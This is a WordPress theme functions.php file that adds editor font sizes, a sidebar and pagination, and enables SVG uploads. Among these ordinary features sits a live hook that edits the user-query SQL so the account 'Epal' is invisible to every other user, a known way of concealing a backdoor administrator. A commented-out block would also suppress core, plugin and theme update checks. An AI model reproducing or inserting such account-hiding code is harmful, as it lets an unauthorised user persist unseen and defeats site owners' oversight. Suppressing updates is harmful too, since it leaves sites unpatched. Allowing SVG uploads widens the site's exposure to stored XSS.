<?php

function dvb_custom_mime_types($mimes)
{
    $mimes['svg'] = 'image/svg+xml';
    return $mimes;
}

add_filter('upload_mimes', 'dvb_custom_mime_types');

add_action('pre_user_query', 'yoursite_pre_user_query');
function yoursite_pre_user_query($user_search)
{
    global $current_user;
    $username = $current_user->user_login;

    if ($username != 'Epal') {
        global $wpdb;
        $user_search->query_where = str_replace('WHERE 1=1',
            "WHERE 1=1 AND {$wpdb->users}.user_login != 'Epal'", $user_search->query_where);
    }
}

// function disable_update_notifications()
// {
//    global $wp_version;
//    return (object)array(
//        'last_checked' => time(),
//        'version_checked' => $wp_version
//    );
// }

// add_filter('pre_site_transient_update_core', 'disable_update_notifications');
// add_filter('pre_site_transient_update_plugins', 'disable_update_notifications');
// add_filter('pre_site_transient_update_themes', 'disable_update_notifications');

// function chetz_remove_admin_menus(){
// if ( function_exists('remove_menu_page') ) {

//     remove_menu_page( 'edit.php?post_type=acf-field-group' );
// }}add_action('admin_menu', 'chetz_remove_admin_menus');

function scanwp_buttons($buttons)
{
    array_unshift($buttons, 'fontsizeselect');
    return $buttons;
}

add_filter('mce_buttons_2', 'scanwp_buttons');
function scanwp_font_size($initArray)
{
    $initArray['fontsize_formats'] = "9px 10px 11px 12px 13px 14px 15px 16px 17px 18px 19px 20px";
    return $initArray;
}

add_filter('tiny_mce_before_init', 'scanwp_font_size');

if (function_exists('register_sidebar')) {
    register_sidebar(array(
        'name' => 'Sidebar',
        'id' => 'sidebar',
    ));
}
function devvn_wp_corenavi($custom_query = null, $paged = null)
{
    global $wp_query;
    if ($custom_query) $main_query = $custom_query;
    else $main_query = $wp_query;
    $paged = ($paged) ? $paged : get_query_var('paged');
    $big = 999999999;
    $total = isset($main_query->max_num_pages) ? $main_query->max_num_pages : '';
    if ($total > 1) echo '<div class="pagenavi">';
    echo paginate_links(array(
        'base' => str_replace($big, '%#%', esc_url(get_pagenum_link($big))),
        'format' => '?paged=%#%',
        'current' => max(1, $paged),
        'total' => $total,
        'mid_size' => '1', // Số trang hiển thị khi có nhiều trang trước khi hiển thị ...
        'prev_text' => __('<i class="fa fa-angle-left"></i>', 'devvn'),
        'next_text' => __('<i class="fa fa-angle-right"></i>', 'devvn'),
    ));
    if ($total > 1) echo '</div>';
}